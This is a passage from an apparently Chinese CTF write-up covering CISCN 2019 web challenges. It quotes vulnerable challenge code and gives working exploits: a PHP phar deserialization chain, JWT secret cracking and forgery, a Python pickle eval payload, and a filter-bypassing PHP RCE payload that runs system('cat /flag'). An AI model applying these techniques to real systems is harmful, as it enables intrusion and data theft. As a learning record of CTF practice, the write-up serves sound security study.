class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, <span class="string">"flag"</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">    Header(<span class="string">"Content-Disposition: attachment; filename="</span> . basename($filename));</span><br><span class="line">    <span class="keyword">echo</span> $file-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File not exist"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计源码第一反应首先是sql注入。但是随即发现不存在可控参数，所以注入无果。接下来重心放在反序列化上。首先需要明确的是，我们源码中并不存在<code>unserialize()</code>函数，但是我们有文件上传点。所以反序列化需要通过上传phar文件并进行<code>phar://</code>伪协议触发。</p><p>接下来寻找常见文件读取函数，注意到File类<code>file_get_contents()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>确定是可以进行文件读取了。接下来挖掘一下函数的调用。首先<code>close()</code>是File类的方法，而File类只在Filelist类中有调用过。但Filelist中并没有调用<code>close()</code>方法的位置。此时需要注意Filelist类中的两个魔术方法之一：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>它将Filelist类中的files数组全部遍历了一遍，并执行对应的<code>func()</code>结果被存进result。之后的<code>__destruct()</code>方法则会将result等等结果打印出来。<br>这一条利用在于：确保了Filelist的对象如果能借此魔术方法调用<code>close()</code>方法，那么它最后销毁时析构函数会打印出我们需要的文件内容。<br>之后再次审计，注意到User类的<code>__destruct()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>原本只是一个同名<code>close()</code>函数，但是此处却存在着可利用之处。假如我们的文件上传的是User类的对象。销毁时自然会执行<code>close()</code>函数。但如果把<code>db</code>设置为Filelist类的对象，那么<code>db-&gt;close()</code>执行时将找不到<code>close()</code>函数，进而执行其<code>files</code>数组里的每一个函数。那么如果<code>files</code>数组里是存在同名函数<code>close</code>的File类对象，就能成功执行文件读取。<br>找到利用链后，exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"a.phar"</span>); </span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); </span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>生成的a.phar修改后缀上传，之后需要找触发方式，此处需要注意一点，在download.php中，设置了目录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br></pre></td></tr></table></figure><p>而只有delete.php中的目录是在题目给定的文件上传沙盒中的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br></pre></td></tr></table></figure><p>故只有delete操作能直接<code>phar://</code>触发反序列化。<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag1.PNG" alt="flag"></p><p>(这里的文件读取flag.txt是传统艺能？每次题目都没交代）</p><h1 id="ikun-python反序列化"><a href="#ikun-python反序列化" class="headerlink" title="ikun(python反序列化)"></a>ikun(python反序列化)</h1><p>结合了很多知识点的一道题目，但是最后一步的python反序列化确实不会，只好去找了找wp。(本来之前打算学下python反序列化的，结果搞忘了hhh) </p><p>首先登陆题目发现在迫害cxk，同时底下有许多商品提示需要购买lv6的商品。但是看了半天前几页并没找到lv6商品，由于页数page直接get传值，看来需要脚本爆破一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://2c771d3e-86f0-4f72-9815-f19dcb4fd51a.node3.buuoj.cn/shop?page='</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">r=requests.get(url+str(i))</span><br><span class="line"><span class="keyword">if</span> <span class="string">'lv6.png'</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="keyword">print</span> (i)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>之后发现lv6商品，加入到购物车后，准备注册账号并登录购买。显然钱数是不够的，但是却有折扣这一参数被直接post传值。那么修改其值足够小即可。得到一个目录<code>b1g_m4mber</code>。应该是后台地址。<br>访问网址提示需要admin操作权限。这里抓包一下，发现cookie里居然有JWT。看来是比较常见的JWT伪造认证了。<br>(之前在hackthebox某一台靶机中就存在仿造JWT登录的操作，应该说并不难，而且比较好理解)<br>先拿来base64解码，发现存在乱码。可能是因为加了盐值key的原因。那么第一步先爆破下key值：<br><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker</a><br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/1.PNG" alt="1.PNG"><br>得到JWTKey 为1Kun,接下来上<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a><br>去生成admin的jwt token.<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/2.PNG" alt="jwt伪造"><br>可以看到jwt-token一定是xxx.yyy.zzz的形式。且三段各自代表header,paylaod，signature的json数据内容经base64处理。爆破key值修改paylload为admin也是家常便饭。<br>控制台里修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie&#x3D;&quot;JWT&#x3D;xxxxxxxxxxx&quot;</span><br></pre></td></tr></table></figure><p>成功登陆。</p><p>之后发现源码存在<a href="http://www.zip。可以拿到源码。然后我就不会了" target="_blank" rel="noopener">www.zip。可以拿到源码。然后我就不会了</a>…….<br>查wp后发现是python反序列化。具体漏洞在Admin.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>become可控。<br>这里其实可以把<code>pickle.loads</code>的操作理解为反序列化。而<code>__reduce__</code>这一魔术方法会在对象被pickle时调用。从而可以构造payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a= urllib.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>这里我的exp在本机跑出来结果不知为何是错的。只有用kali才跑出正确的结果<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/3.PNG" alt="exp"><br>传值拿flag<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag2.PNG" alt="flag"></p><h1 id="Love-Math-构造RCE"><a href="#Love-Math-构造RCE" class="headerlink" title="Love Math(构造RCE)"></a>Love Math(构造RCE)</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目很有意思，达成目的显然是RCE。但是可以发现过滤了很多字符与函数，限制了长度。而白名单内的函数全部是数学函数，黑名单的字符过滤了常见标点。现在要达成RCE需要绕过上的奇淫技巧。</p><p>首先有一种思路是分开传值 ，我个人也比较偏好这种做法。具体形式大致是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;$_GET[a]&amp;a&#x3D;system(&#39;ls&#39;);</span><br></pre></td></tr></table></figure><p>但是此题首先变量名不能随意，只能从白名单中找出可用数学符号作为变量名。此处考虑长度使用pi。<br>然后是考虑，在<code>_GET[]</code>被过滤的情况下能使用什么数学函数达成构造字符串的目的。这里应该首先考虑进制转换函数，因为10进制以上的数都有英文字母作为数码。而假如是36进制数的话，将会拥有1~10加上26个英文字母作为数码，这足以我们拼凑出payload。<br>假如payload是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;($_GET)&#123;0&#125;($_GET)&#123;1&#125;;&amp;0&#x3D;system&amp;1&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure><p>那么我们只需构造出<code>_GET</code>字符串。<br>具体倒推方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_GET-&gt;bin2hex(&#39;_GET&#39;)-&gt;5f474554</span><br><span class="line">-&gt;hexdec(&#39;5f474554&#39;)-&gt;1598506324#纯数字</span><br><span class="line">#需要构造hex2bin()</span><br><span class="line">base_convert(&#39;hex2bin&#39;,36,10)-&gt;37907361743</span><br></pre></td></tr></table></figure><p>所以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));</span><br><span class="line">$pi&#x3D;hex2bin(5f474554);</span><br><span class="line">$pi&#x3D;_GET;</span><br><span class="line">$$pi&#x3D;$_GET;</span><br></pre></td></tr></table></figure><p>故最后payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag.PNG" alt="flag"><br>除此之外还可以构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(getallheaders()&#123;1&#125;)</span><br></pre></td></tr></table></figure><p>在headers里加上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1:cat &#x2F;flag</span><br></pre></td></tr></table></figure><p>这一项执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br></pre></td></tr></table></figure><p>由于结果是echo返回的，上面使用逗号可以将两个结果都打印出来。<br>其他思路包括直接构造RCE语句，但是感觉没有上面的方法用起来舒服。看到网上还有其他非常有意思的解法，就不一一列举了。</p><h1 id="CyberPunk-二次注入"><a href="#CyberPunk-二次注入" class="headerlink" title="CyberPunk(二次注入)"></a>CyberPunk(二次注入)</h1><p>上来index.php中给了姓名，电话，地址三个框来填。同时还有三个功能：查询，修改，删除。由于查询这一个操作都只要姓名电话，我猜测剩下的地址这个参数可能是通过输入姓名电话对地址进行某种触发式注入。基本可以猜测是sql注入题型。</p><p>从源码处得到一个file参数。果断文件包含读到源码：<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/var/www/html/'</span>);</span><br><span class="line"></span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]) ? $_GET[<span class="string">'file'</span>] : <span class="keyword">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/phar|zip|bzip2|zlib|data|input|%00/i"</span>,$file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">'no way!'</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>search.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">if</span>(!$row) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">"&lt;p&gt;姓名:"</span>.$row[<span class="string">'user_name'</span>].<span class="string">"&lt;/p&gt;&lt;p&gt;, 电话:"</span>.$row[<span class="string">'phone'</span>].<span class="string">"&lt;/p&gt;&lt;p&gt;, 地址:"</span>.$row[<span class="string">'address'</span>].<span 